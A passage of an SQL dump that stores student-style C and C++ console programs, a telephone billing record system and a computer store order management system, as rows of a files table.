system(\"cls\");\r\n				gotoxy(1,25);\r\n				printf(\"\\xDB\\xDB\\xDB\\xDB\\xDB\\xDB\\xDB\");\r\n				gotoxy(1,26);\r\n				printf(\"   \\xDB\");\r\n				gotoxy(1,27);\r\n				printf(\"   \\xDB\");\r\n				gotoxy(1,28);\r\n				printf(\"   \\xDB\");\r\n				gotoxy(1,29);\r\n				printf(\"   \\xDB\");\r\n				gotoxy(1,30);\r\n				printf(\"   \\xDB\");\r\n				gotoxy(1,31);\r\n				printf(\"   \\xDB\");\r\n				gotoxy(10,25);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(10,26);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(10,27);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(10,28);\r\n				printf(\"\\xDB\\xDB\\xDB\\xDB\\xDB\\xDB\\xDB\");\r\n				gotoxy(10,29);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(10,30);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(10,31);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(19,25);\r\n				printf(\"\\xDB\\xDB\\xDB\\xDB\\xDB\\xDB\\xDB\");\r\n				gotoxy(19,26);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(19,27);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(19,28);\r\n				printf(\"\\xDB\\xDB\\xDB\\xDB\\xDB\\xDB\\xDB\");\r\n				gotoxy(19,29);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(19,30);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(19,31);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(28,25);\r\n				printf(\"      \\xDB\");\r\n				gotoxy(28,26);\r\n				printf(\"\\xDB\\xDB    \\xDB\");\r\n				gotoxy(28,27);\r\n				printf(\"\\xDB \\xDB   \\xDB\");\r\n				gotoxy(28,28);\r\n				printf(\"\\xDB  \\xDB  \\xDB\");\r\n				gotoxy(28,29);\r\n				printf(\"\\xDB   \\xDB \\xDB\");\r\n				gotoxy(28,30);\r\n				printf(\"\\xDB    \\xDB\\xDB\");\r\n				gotoxy(28,31);\r\n				printf(\"\\xDB\");\r\n			    gotoxy(37,25);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(37,26);\r\n				printf(\"\\xDB    \\xDB\");\r\n				gotoxy(37,27);\r\n				printf(\"\\xDB   \\xDB\");\r\n				gotoxy(37,28);\r\n				printf(\"\\xDB\\xDB\\xDB\\xDB\");\r\n				gotoxy(37,29);\r\n				printf(\"\\xDB   \\xDB\");\r\n				gotoxy(37,30);\r\n				printf(\"\\xDB    \\xDB\");\r\n				gotoxy(37,31);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(46,25);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(46,26);\r\n				printf(\" \\xDB   \\xDB\");\r\n				gotoxy(46,27);\r\n				printf(\"  \\xDB \\xDB\");\r\n				gotoxy(46,28);\r\n				printf(\"   \\xDB\");\r\n				gotoxy(46,29);\r\n				printf(\"   \\xDB\");\r\n				gotoxy(46,30);\r\n				printf(\"   \\xDB\");\r\n				gotoxy(46,31);\r\n				printf(\"   \\xDB\");\r\n				gotoxy(55,25);\r\n				printf(\"\\xDB\\xDB\\xDB\\xDB\\xDB\\xDB\\xDB\");\r\n				gotoxy(55,26);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(55,27);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(55,28);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(55,29);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(55,30);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(55,31);\r\n				printf(\"\\xDB\\xDB\\xDB\\xDB\\xDB\\xDB\\xDB\");\r\n				gotoxy(64,25);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(64,26);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(64,27);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(64,28);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(64,29);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(64,30);\r\n				printf(\"\\xDB     \\xDB\");\r\n				gotoxy(64,31);\r\n				printf(\"\\xDB\\xDB\\xDB\\xDB\\xDB\\xDB\\xDB\");\r\n	            Sleep(2000);\r\n				exit(0);\r\n				break;\r\n			default:\r\n				system(\"cls\");\r\n				gotoxy(30,20);\r\n				printf(\"Incorrect Input\");\r\n				printf(\"\\a......\");\r\n				gotoxy(30,24);\r\n				printf(\"Any key to continue\");\r\n				getch();\r\n		}\r\n	}\r\n}\r\n COORD coord = {0, 0};\r\n\r\nCOORD max_res,cursor_size;\r\nvoid gotoxy (int x,int y)\r\n{\r\n\r\ncoord.X = x; coord.Y = y;\r\n\r\n\r\nSetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);\r\n}\r\n\r\nvoid addrecords()\r\n{\r\n	FILE *f;\r\n	char test;\r\n	f=fopen(\"pro.txt\",\"ab+\");\r\n	if(f==0)\r\n	{   f=fopen(\"pro.txt\",\"wb+\");\r\n		system(\"cls\");\r\n		printf(\"Please wait while we configure your computer\");\r\n		printf(\"\\npress any key to continue\");\r\n		getch();\r\n	}\r\n	while(1)\r\n	{\r\n		system(\"cls\");\r\n		printf(\"\\n Enter phone number: \");\r\n		scanf(\"%s\",&s.phonenumber);\r\n		printf(\"\\n Enter name: \");\r\n		fflush(stdin);\r\n		scanf(\"%s\",&s.name);\r\n		printf(\"\\n Enter amount: \");\r\n		scanf(\"%f\",&s.amount);\r\n		fwrite(&s,sizeof(s),1,f);\r\n		fflush(stdin);\r\n		printf(\"\\n\\n Record Is Successfully Added\");\r\n		printf(\"\\n Press esc Key to exit or Press any other key to add other record:\");\r\n		test=getche();\r\n		if(test==27)\r\n			break;\r\n	}\r\n	fclose(f);\r\n	system(\"cls\");\r\n}\r\nvoid listrecords()\r\n{\r\n	FILE *f;\r\n	int i;\r\n	if((f=fopen(\"pro.txt\",\"rb\"))==NULL)\r\n		exit(0);\r\n	system(\"cls\");\r\n	printf(\"Phone Number\\t\\tUser Name\\tAmount\\n\");\r\n	for(i=0;i<79;i++)\r\n		printf(\"-\");\r\n	while(fread(&s,sizeof(s),1,f)==1)\r\n	{\r\n		printf(\"\\n%s\\t\\t%s\\t\\t$. %.2f /-\",s.phonenumber,s.name,s.amount);\r\n	}\r\n	printf(\"\\n\");\r\n	for(i=0;i<79;i++)\r\n		printf(\"-\");\r\n\r\nfclose(f);\r\nprintf(\"\\n\\nPress Any Key To Go Back\");\r\ngetch();\r\nsystem(\"cls\");\r\n}\r\nvoid deleterecords()\r\n{\r\n	FILE *f,*t;\r\n	char phonenumber[20];\r\n	system(\"cls\");\r\n	f=fopen(\"pro.txt\",\"rb+\");\r\n	t=fopen(\"pro1.txt\",\"wb+\");\r\n	do{\r\n	rewind(f);\r\n	printf(\"Enter the phone number to be deleted from the Database: \");\r\n	scanf(\"%s\",phonenumber);\r\n	while(fread(&s,sizeof(s),1,f)==1)\r\n	{\r\n		if(strcmp(s.phonenumber,phonenumber)!=0)\r\n		{       	fwrite(&s,sizeof(s),1,t);\r\n\r\n		}\r\n		else\r\n		printf(\"Record deleted successfully.\");\r\n	}\r\n\r\n	fclose(f);\r\n	fclose(t);\r\n	remove(\"pro.txt\");\r\n	rename(\"pro1.txt\",\"pro.txt\");\r\n\r\n	f=fopen(\"pro.txt\",\"rb+\");\r\n	t=fopen(\"pro1.txt\",\"wb+\");\r\n    printf(\"\\nDo you want to delete another record (y/n):\");\r\n	fflush(stdin);\r\n	  }\r\n    	while(getche()==\'y\'||getche()==\'Y\');\r\n		fclose(f);\r\n	getch();\r\n	system(\"cls\");\r\n}\r\nvoid searchrecords()\r\n{\r\n	FILE *f;\r\n	char phonenumber[20];\r\n	int flag=1;\r\n	f=fopen(\"pro.txt\",\"rb+\");\r\n\r\n	fflush(stdin);\r\n	system(\"cls\");\r\n	printf(\"Enter Phone Number to search in our database: \");\r\n	scanf(\"%s\", phonenumber);\r\n	while(fread(&s,sizeof(s),1,f)==1)\r\n	{\r\n		if(strcmp(s.phonenumber,phonenumber)==0)\r\n		{	system(\"cls\");\r\n			printf(\" Record Found \");\r\n			printf(\"\\n\\nPhonenumber: %s\\nName: %s\\nAmount: $.%0.2f\\n\",s.phonenumber,s.name,s.amount);\r\n			flag=0;\r\n			break;\r\n		}\r\n		else if(flag==1)\r\n		{	system(\"cls\");\r\n			printf(\"Requested Phone Number Not found in our database\");\r\n		}\r\n	}\r\n	getch();\r\n	fclose(f);\r\n	system(\"cls\");\r\n}\r\nvoid modifyrecords()\r\n{\r\n		FILE *f;\r\n	char phonenumber[20];\r\n	long int size=sizeof(s);\r\n	if((f=fopen(\"pro.txt\",\"rb+\"))==NULL)\r\n		exit(0);\r\n	system(\"cls\");\r\n	printf(\"Enter phone number of the subscriber to modify: \");\r\n	scanf(\"%s\",phonenumber);\r\n	fflush(stdin);\r\n	while(fread(&s,sizeof(s),1,f)==1)\r\n	{\r\n		if(strcmp(s.phonenumber,phonenumber)==0)\r\n		{\r\n			system(\"cls\");\r\n			printf(\"\\n Enter phone number: \");\r\n			scanf(\"%s\",&s.phonenumber);\r\n			printf(\"\\n Enter name: \");\r\n			fflush(stdin);\r\n			scanf(\"%[^\\n]\",&s.name);\r\n			printf(\"\\n Enter amount: \");\r\n			scanf(\"%f\",&s.amount);\r\n			fseek(f,-size,SEEK_CUR);\r\n			fwrite(&s,sizeof(s),1,f);\r\n			break;\r\n		}\r\n	}\r\n	fclose(f);\r\n	system(\"cls\");\r\n}\r\nvoid payment()\r\n{\r\n	FILE *f;\r\n	char phonenumber[20];\r\n	long int size=sizeof(s);\r\n	float amt;\r\n	int i;\r\n	if((f=fopen(\"pro.txt\",\"rb+\"))==NULL)\r\n		exit(0);\r\n	system(\"cls\");\r\n	printf(\"Enter phone number of the subscriber for payment: \");\r\n	scanf(\"%s\",phonenumber);\r\n	fflush(stdin);\r\n	while(fread(&s,sizeof(s),1,f)==1)\r\n	{\r\n		if(strcmp(s.phonenumber,phonenumber)==0)\r\n		{\r\n			printf(\"\\n ***DETAILS***\");\r\n			printf(\"\\n Phone No.: %s\",s.phonenumber);\r\n			printf(\"\\n Name: %s\",s.name);\r\n			printf(\"\\n Current amount: %f\",s.amount);\r\n			printf(\"\\n\");\r\n			for(i=0;i<79;i++)\r\n				printf(\"-\");\r\n			printf(\"\\n\\nEnter amount of payment: \");\r\n			fflush(stdin);\r\n			scanf(\" %f\",&amt);\r\n			s.amount=s.amount-amt;\r\n			fseek(f,-size,SEEK_CUR);\r\n			fwrite(&s,sizeof(s),1,f);\r\n			break;\r\n		}\r\n	}\r\n	printf(\"\\n\\n\");\r\n	printf(\"System Message: THANK YOU %s FOR YOUR TIMELY PAYMENTS!!\",s.name);\r\n	getch();\r\n	fclose(f);\r\n	system(\"cls\");\r\n}\r\nvoid login()\r\n{\r\n	int a=0,i=0;\r\n    char uname[10],c=\' \';\r\n    char pword[10],code[10];\r\n    char user[10]=\"user\";\r\n    char pass[10]=\"pass\";\r\n    do\r\n{\r\n\r\n    printf(\"\\n  ************************** USER LOGIN  **************************  \");\r\n    printf(\" \\n                       ENTER USERNAME:-\");\r\n	scanf(\"%s\", &uname);\r\n	printf(\" \\n                       ENTER PASSWORD:-\");\r\n	while(i<10)\r\n	{\r\n	    pword[i]=getch();\r\n	    c=pword[i];\r\n	    if(c==13) break;\r\n	    else printf(\"*\");\r\n	    i++;\r\n	}\r\n	pword[i]=\'\\0\';\r\n	i=0;\r\n		if(strcmp(uname,\"admin\")==0 && strcmp(pword,\"admin\")==0)\r\n	{\r\n	printf(\"  \\n\\n\\n       WELCOME TO OUR SYSTEM !!!! LOGIN IS SUCCESSFUL\");\r\n	printf(\"\\n\\n\\n\\t\\t\\t\\tPress any key to continue...\");\r\n	getch();\r\n	break;\r\n	}\r\n	else\r\n	{\r\n		printf(\"\\n        SORRY !!!!  LOGIN IS UNSUCESSFUL\");\r\n		a++;\r\n\r\n		getch();\r\n		system(\"cls\");\r\n\r\n	}\r\n}\r\n	while(a<=2);\r\n	if (a>2)\r\n	{\r\n		printf(\"\\nSorry you have entered the wrong username and password for four times!!!\");\r\n\r\n		getch();\r\n\r\n		}\r\n		system(\"cls\");\r\n}\r\n\r\n', '2024-07-10 04:15:19', '2024-07-10 04:15:19'),
(15, 14, 'class.cpp', '// Create a class\r\nclass computerType\r\n{\r\npublic:\r\n    void take_order();    // to take the order\r\n    void delete_order();  // to delete the order\r\n    void modify();        // to modify the order\r\n    void order_list();    // to display the order list\r\n    void daily_summary(); // to display daily summary\r\n    void exit();          // to exit system\r\n};', '2024-07-12 13:05:58', '2024-07-12 13:05:58'),
(16, 14, 'computer storage management system in c++', '#include \"Class.cpp\"\r\n#include \"Structure.cpp\"\r\n#include \"TakeOrder.cpp\"\r\n#include \"DeleteOrder.cpp\"\r\n#include \"DisplayReceipt.cpp\"\r\n#include \"ModifyOrder.cpp\"\r\n#include \"DailySummary.cpp\"\r\n#include \"Exit.cpp\"\r\n\r\nint main() // main function\r\n{\r\n    // Create an object of class computerType\r\n    computerType computer;\r\n\r\n    int menu;\r\n\r\n    do\r\n    {\r\n        system(\"cls\");\r\n\r\n        cout << \"\\t\\t==================================================\\n\";\r\n        cout << \"\\t\\t\\t Computer Store Management System \\n\";\r\n        cout << \"\\t\\t==================================================\\n\\n\";\r\n        cout << \"\\t\\t---------------------------------------------------\\n\";\r\n        cout << \"\\t\\t||\\t1. Make an Order \\t\\t         ||\\n\";\r\n        cout << \"\\t\\t||\\t2. Delete Order\\t\\t\\t         ||\\n\";\r\n        cout << \"\\t\\t||\\t3. Modify Order Record \\t\\t\\t ||\\n\";\r\n        cout << \"\\t\\t||\\t4. Print Receipt                  \\t ||\\n\";\r\n        cout << \"\\t\\t||\\t5. Daily Summary of Total Sale \\t\\t ||\\n\";\r\n        cout << \"\\t\\t||\\t6. Exit\\t\\t\\t\\t\\t ||\\n\";\r\n        cout << \"\\t\\t---------------------------------------------------\\n\";\r\n\r\n        cout << \"\\nEnter Choice: \";\r\n        cin >> menu;\r\n\r\n        switch (menu)\r\n        {\r\n        case 1:\r\n        {\r\n            computer.take_order(); // Function add\r\n            break;\r\n        } // End case 1\r\n\r\n        case 2:\r\n        {\r\n            computer.delete_order(); // Function delete\r\n            system(\"PAUSE\");\r\n            break;\r\n        } // End case 2\r\n\r\n        case 3:\r\n        {\r\n            computer.modify(); // Function modify\r\n            system(\"PAUSE\");\r\n            break;\r\n        } // End case 3\r\n\r\n        case 4:\r\n        {\r\n            computer.order_list(); // Function order\r\n            system(\"PAUSE\");\r\n            break;\r\n        } // End case 4\r\n        case 5:\r\n        {\r\n            computer.daily_summary(); // Function daily_summary\r\n            system(\"PAUSE\");\r\n            break;\r\n        } // End case 5\r\n\r\n        case 6:\r\n        {\r\n            computer.exit(); // Function exit\r\n            goto a;\r\n            break;\r\n        } // End case 6\r\n\r\n        default:\r\n        {\r\n            cout << \"Invalid input\\nPlease re-enter the input\\n\"\r\n                 << endl;\r\n        } // End default\r\n\r\n        } // End Switch\r\n\r\n    } while (menu != 6); // End do\r\n\r\na: // goto\r\n\r\n    cout << \"\\t\\t===========================\\n\";\r\n    cout << \"\\t\\t\\tThank You!!!\\n\";\r\n    cout << \"\\t\\t===========================\\n\\n\";\r\n\r\n    system(\"PAUSE\");\r\n\r\n    return 0;\r\n\r\n} // End main function\r\n\r\n\r\n////////////////////////////END OF THE PROGRAM//////////////////////////////////////////\r\n', '2024-07-12 13:07:00', '2024-07-12 13:07:00'),
(17, 14, 'Dayly summary.cpp', '// Function to display Daily Summary\r\n// Time Complexity - O(n^2)\r\nvoid computerType ::daily_summary()\r\n{\r\n    int i, num;\r\n    string str = \"\\t\\t===========================================\\n\";\r\n\r\n    system(\"cls\");\r\n    node *temp;\r\n\r\n    temp = start_ptr;\r\n\r\n    if (temp == NULL) // Invalid receipt code\r\n    {\r\n        cout << endl << str;\r\n        cout << \"\\t\\t\\tThere is no Order to show!!!\\n\\t\\t\\tThe List is Empty\\n\";\r\n        cout << str << endl;\r\n    }\r\n\r\n    else\r\n    {\r\n        cout << \"\\n\";\r\n        cout << \"================================================================================================\" << endl;\r\n        cout << \" \\t\\t\\tHere is the Daily Summary of All Orders \\n\"; //print all receipt\r\n        cout << \"================================================================================================\\n\"\r\n             << endl;\r\n\r\n        while (temp != NULL)\r\n        {\r\n\r\n            cout << \"Receipt Number : \" << temp->receipt_number << endl;\r\n            cout << \"Customer Name  : \" << temp->customerName << endl;\r\n            cout << \"Order Date     : \" << temp->date << endl\r\n                 << endl;\r\n\r\n            cout << \"+===================+==============================+====================+=======================+\" << endl;\r\n            cout << \"|   Computer Type   |         Computer Name        |      Quantity      |     Total Price ($) |\" << endl;\r\n            cout << \"+===================+==============================+====================+=======================+\" << endl;\r\n\r\n            for (i = 0; i < temp->x; i++)\r\n            {\r\n                cout << \"\\t\" << temp->type[temp->menu2[i] - 1] << \"  \\t\\t\";\r\n                cout << \" \" << temp->computerName[temp->menu2[i] - 1] << \"\\t  \";\r\n                cout << \"\\t    \" << temp->quantity[i] << \"\\t\";\r\n                cout << \"\\t\\t\" << temp->amount[i] << \".00\" << endl;\r\n                cout << \"+-------------------+------------------------------+--------------------+-----------------------+\" << endl;\r\n            }\r\n\r\n            temp->total = temp->amount[0] + temp->amount[1] + temp->amount[2] + temp->amount[3] + temp->amount[4] + temp->amount[5] + temp->amount[6] + temp->amount[7] + temp->amount[8] + temp->amount[9];\r\n            cout << \"\\nTotal Bill is : \" << \"$\" << temp->total << \".00/-\\n\";\r\n\r\n            cout << \"\\n=================================================================================================\\n\"\r\n                 << endl;\r\n\r\n            temp = temp->next;\r\n        }\r\n    }\r\n\r\n} // End daily summary\r\n', '2024-07-12 13:12:09', '2024-07-12 13:12:09');
INSERT INTO `files` (`id`, `project_id`, `name`, `content`, `created_at`, `updated_at`) VALUES
(18, 14, 'Delete Order.cpp', '// Function to delete order\r\n// Time Complexity - O(n)\r\nvoid computerType ::delete_order(){\r\n    system(\"cls\");\r\n    string str = \"\\t===========================================\\n\";\r\n\r\n    if (start_ptr == NULL){\r\n        cout << endl;\r\n        cout << str;\r\n        cerr << \"\\t     Can not delete from an Empty List\\n\";\r\n        cout << str;\r\n        cout << endl;\r\n    }else{\r\n        int i, num, count;\r\n        cout << \"\\nEnter the receipt numnber you want to delete: \";\r\n        cin >> num;\r\n        node *q;\r\n        node *temp;\r\n        bool found = false;\r\n\r\n        if (start_ptr->receipt_number == num){\r\n            q = start_ptr;\r\n            start_ptr = start_ptr->next;\r\n            count--;\r\n\r\n            if (start_ptr == NULL)\r\n                last = NULL;\r\n\r\n            delete q;\r\n\r\n            cout << \"\\n\\t\\t========================================\\n\";\r\n            cout << \"\\t\\t The Receipt is Deleted Successfully!!!\" << endl;\r\n            cout << \"\\t\\t========================================\\n\\n\";\r\n        }else{\r\n            temp = start_ptr;\r\n            q = start_ptr->next;\r\n\r\n            while ((!found) && (q != NULL))\r\n            {\r\n                if (q->receipt_number != num)\r\n                {\r\n                    temp = q;\r\n                    q = q->next;\r\n                }\r\n\r\n                else\r\n                    found = true;\r\n            }\r\n\r\n            if (found)\r\n            {\r\n                temp->next = q->next;\r\n                count--;\r\n\r\n                if (last == q)\r\n                    last = temp;\r\n                delete q;\r\n\r\n                cout << \"\\n\\t\\t========================================\\n\";\r\n                cout << \"\\t\\t The Receipt is Deleted Successfully!!!\" << endl;\r\n                cout << \"\\t\\t========================================\\n\\n\";\r\n            }\r\n\r\n            else\r\n            {\r\n                cout << \"\\n\\t\\t==========================================\\n\";\r\n                cout << \"\\t\\t Item to be deleted is not in the list!!!\" << endl;\r\n                cout << \"\\t\\t==========================================\\n\\n\";\r\n            }\r\n        }\r\n    }\r\n\r\n} // End function delete_order', '2024-07-12 13:19:17', '2024-07-12 13:19:17'),
(19, 14, 'DisplayReceipt.cpp', '// Function to display receipt\r\n// Time Complexity - O(n^2)\r\nvoid computerType ::order_list(){\r\n    int i, num;\r\n    bool found = false; // Variable to search\r\n\r\n    string str = \"\\t\\t===========================================\\n\";\r\n\r\n    system(\"cls\");\r\n\r\n    node *temp = start_ptr;\r\n\r\n    if (temp == NULL) // If list is empty{\r\n        cout << endl << str;\r\n        cout << \"\\t\\t\\tThere is no Order to show!!!\\n\\t\\t\\tThe List is Empty\\n\";\r\n        cout << str << endl;\r\n    }else{\r\n        cout << \"\\nEnter the Receipt Number To Print The Receipt: \";\r\n        cin >> num;\r\n        cout << \"\\n\";\r\n\r\n        while (temp != NULL && !found){\r\n            if (temp->receipt_number == num)\r\n                found = true;\r\n            else\r\n                temp = temp->next;\r\n\r\n            if (found) // Print the receipt\r\n            {\r\n                cout << \"===============================================================================\" << endl;\r\n                cout << \"\\t\\t\\t\\t  Here is the Ordered list\\n\";\r\n                cout << \"===============================================================================\\n\"\r\n                     << endl;\r\n\r\n                cout << \"Receipt Number : \" << temp->receipt_number << endl;\r\n                cout << \"Customer Name  : \" << temp->customerName << endl;\r\n                cout << \"Order Date     : \" << temp->date << endl\r\n                     << endl;\r\n\r\n                cout << \"+==================+======================+==============+===================\" << endl;\r\n                cout << \"|  Computer Type   |     Computer Name    |   Quantity   |  Total Price ($) |\" << endl;\r\n                cout << \"+==================+======================+==============+===================\" << endl;\r\n\r\n                for (i = 0; i < temp->x; i++){\r\n                    cout << \"   \"<< temp->type[temp->menu2[i] - 1] << \"   \";\r\n                    cout << \"\\t\\t\" << temp->computerName[temp->menu2[i] - 1] << \"     \";\r\n                    cout << \"\\t\" << temp->quantity[i] << \"\\t\";\r\n                    cout << \"   \" << temp->amount[i] << \".00\" << endl;\r\n                    cout << \"+------------------+------------------------------+--------------------+-----\" << endl;\r\n                }\r\n\r\n                temp->total = temp->amount[0] + temp->amount[1] + temp->amount[2] + temp->amount[3] + temp->amount[4] + temp->amount[5] + temp->amount[6] + temp->amount[7] + temp->amount[8] + temp->amount[9];\r\n                cout << \"\\nTotal Bill: \" << temp->total << \".00/- $.\";\r\n                cout << \"\\n\\n\";\r\n\r\n                cout << \"Thank You!!!\\n\";\r\n                cout << \"------------\\n\";\r\n                cout << \"================================================================================\\n\\n\";\r\n            }\r\n\r\n        }\r\n\r\n        if (!found){\r\n            cout << str;\r\n            cout << \"\\t\\t\\t  Invalid Receipt Number!\\n\";\r\n            cout << str << endl;\r\n        }\r\n    }\r\n} // End function order_list', '2024-07-12 13:20:57', '2024-07-12 13:20:57'),
(20, 14, 'Exit.cpp', '// Function to exit the program\r\nvoid computerType ::exit()\r\n{\r\n\r\n    cout << \"\\nYou chose to Exit.\\n\"\r\n         << endl;\r\n\r\n} // End function exit', '2024-07-12 13:21:21', '2024-07-12 13:21:21'),
(21, 14, 'Header.cpp', '#include <iostream>\r\n#include <bits/stdc++.h>\r\n\r\nusing namespace std;', '2024-07-12 13:21:40', '2024-07-12 13:21:40'),
(22, 14, 'ModifyOrder.cpp', '// Function to modify order\r\n// Time Complexity - O(n^2)\r\nvoid computerType ::modify()\r\n{\r\n    system(\"cls\");\r\n    int i, ch, sid;\r\n    bool found = false;\r\n    temp = start_ptr;\r\n\r\n    if (temp == NULL || sid == 0)\r\n    {\r\n        cout << \"\\n\\t\\t=============================\\n\";\r\n        cout << \"\\t\\t    NO RECORD TO MODIFY...!\\n\";\r\n        cout << \"\\t\\t=============================\\n\\n\";\r\n    }\r\n\r\n    else\r\n    {\r\n        cout << \"\\nEnter Receipt Number To Modify: \";\r\n        cin >> sid;\r\n\r\n        while (temp != NULL && !found)\r\n        {\r\n            if (temp->receipt_number == sid)\r\n                found = true;\r\n\r\n            else\r\n                temp = temp->next;\r\n\r\n            if (found)\r\n            {\r\n                cout << \"Change Order Number: \";\r\n                cin >> temp->receipt_number;\r\n\r\n                cout << \"Change Customer Name: \";\r\n                cin >> temp->customerName;\r\n\r\n                cout << \"Change Date : \";\r\n                cin >> temp->date;\r\n\r\n                cout << \"\\nHow many new laptops would you like to change\" << endl;\r\n                cout << \"(Maximum is 10 order for each transaction): \";\r\n                cin >> temp->x;\r\n\r\n                if (temp->x > 10)\r\n                {\r\n                    cout << \"The laptop you order is exceed the maximum amount of order!\";\r\n                    system(\"pause\");\r\n                }\r\n\r\n                else\r\n                {\r\n                    for (i = 0; i < temp->x; i++)\r\n                    {\r\n                        cout << \"-----------------------------------------\\n\";\r\n                        cout << \"\\nPlease Enter your selection to Change: \";\r\n                        cin >> temp->menu2[i];\r\n\r\n                        cout << \"Change Laptop Name: \" << temp->computerName[temp->menu2[i] - 1] << endl;\r\n\r\n                        cout << \"\\nHow many New laptops do you want: \";\r\n                        cin >> temp->quantity[i];\r\n                        cout << \"\\n-----------------------------------------\\n\";\r\n\r\n                        temp->amount[i] = temp->quantity[i] * temp->computer[temp->menu2[i] - 1];\r\n\r\n                        cout << \"\\n----------------------------------------------------------------\\n\";\r\n                        cout << \"The amount you need to pay after modification is: \" << \"Rs. \" << temp->amount[i] << \".00/-\\n\";\r\n                        cout << \"----------------------------------------------------------------\\n\\n\"; \r\n\r\n                        system(\"PAUSE\");\r\n                    }\r\n\r\n                    temp = temp->next;\r\n\r\n                    system(\"cls\");\r\n                }\r\n\r\n                cout << \"\\n\\t\\t=============================\\n\";\r\n                cout << \"\\t\\t     RECORD MODIFIED....!\" << endl;\r\n                cout << \"\\t\\t=============================\\n\\n\";\r\n            }\r\n\r\n            else\r\n            {\r\n                if (temp != NULL && temp->receipt_number != sid)\r\n                {\r\n                    cout << \"\\n\\t\\t===============================\\n\";\r\n                    cout << \"\\t\\t   Invalid Receipt Number...!\" << endl;\r\n                    cout << \"\\t\\t===============================\\n\\n\";\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n} // End modify function', '2024-07-12 13:22:17', '2024-07-12 13:22:17'),
(23, 14, 'Structure.cpp', '#include \"Header.cpp\"\r\n//Construct node\r\nstruct node{\r\n    int receipt_number, x;\r\n    string customerName, date;\r\n    int quantity[10], menu2[10];\r\n    int amount[10], total;\r\n    string type[10] = {\"8GB\", \"4GB\", \"4GB\", \"8GB\", \"8GB\", \"8GB\", \"4GB\", \"8GB\", \"4GB\", \"8GB\"};\r\n    string specifications[10] = {\"Intel Core i5(10th Gen)\", \"Intel Core i3 (10th Gen)\", \"Intel Core i5(8th Gen)\", \"Intel Core i5 (8th Gen)\", \"macOS Catalina\", \"Intel Core i5(10th Gen)\", \"Intel Core i3(5th Gen)\", \"Intel Core i3(7th Gen)\", \"Intel Core i5(6th Gen)\", \"Intel Core i7(10th Gen)\"};\r\n    string computerName[10] = {\"Dell Inspiron 15 5590\", \"Asus X412FA-EK361T\", \"Lenovo Ideapad 330\", \"Huawei Mach-W19B\", \"Apple MacBook Air\", \"HP 15s-du1034tu\", \"Acer Aspire ES1-571\", \"HP 15-DA0070TX \", \"Lenovo Ideapad 300\", \"HP Pavilion 15-ac028TX\"};\r\n    int computer[10] = {1166, 701, 771, 1366, 2087, 947, 450, 864, 754, 1122};\r\n    // node *prev;\r\n    node *next;\r\n\r\n} *q, *temp; // Pointer declaration\r\nnode *start_ptr = NULL;\r\nnode *head = NULL;\r\nnode *last = NULL;', '2024-07-12 13:23:15', '2024-07-12 13:23:15'),
(24, 14, 'TakeOrder.cpp', '// Function to take order\r\n// Time Complexity - O(n)\r\nvoid computerType ::take_order()\r\n{\r\n    system(\"cls\");\r\n    int i;\r\n    int choice, quantity, price, None;\r\n    string str1 = \"********************************************************************************\\n\";\r\n    string str2 = \"+-------+------+------+------+------+------+------+------+------+------+------+-\\n\";\r\n\r\n    cout << \"-----------------\";\r\n    cout << \"\\nAdd Order Details\\n\";\r\n    cout << \"-----------------\\n\\n\";\r\n\r\n    node *temp;\r\n    temp = new node;\r\n\r\n    cout << str1;\r\n    cout << \"ID \"\r\n         << \"\\t TYPE\"\r\n         << \"\\t\\t SPECIFICATION\"\r\n         << \"\\t\\t NAME\"\r\n         << \"\\t\\t PRICE ($)\" << endl;\r\n    cout << str1;\r\n    cout << \"0001\"\r\n         << \"\\t\"\r\n         << \" 8GB\"\r\n         << \"\\t\"\r\n         << \" Intel Core i5(10th Gen)\"\r\n         << \"\\t\"\r\n         << \"Dell Inspiron 15 5590  \"\r\n         << \"1166\" << endl;\r\n    cout << str2;\r\n    cout << \"0002\"\r\n         << \"\\t\"\r\n         << \" 4GB\"\r\n         << \"\\t\"\r\n         << \" Intel Core i3(10th Gen)\"\r\n         << \"\\t\"\r\n         << \"Asus X412FA-EK361T     \"\r\n         << \"701\" << endl;\r\n    cout << str2;\r\n    cout << \"0003\"\r\n         << \"\\t\"\r\n         << \" 4GB\"\r\n         << \"\\t\"\r\n         << \" Intel Core i5(8th Gen) \"\r\n         << \"\\t\"\r\n         << \"Lenovo Ideapad 330     \"\r\n         << \"771\" << endl;\r\n    cout << str2;\r\n    cout << \"0004\"\r\n         << \"\\t\"\r\n         << \" 8GB\"\r\n         << \"\\t\"\r\n         << \" Intel Core i5 (8th Gen)  \"\r\n         << \"\\t\"\r\n         << \"Huawei Mach-W19B       \"\r\n         << \"1366\" << endl;\r\n    cout << str2;\r\n    cout << \"0005\"\r\n         << \"\\t\"\r\n         << \" 8GB\"\r\n         << \"\\t\"\r\n         << \" macOS Catalina         \"\r\n         << \"\\t\"\r\n         << \"Apple MacBook Air      \"\r\n         << \"2087\" << endl;\r\n    cout << str2;\r\n    cout << \"0006\"\r\n         << \"\\t\"\r\n         << \" 8GB\"\r\n    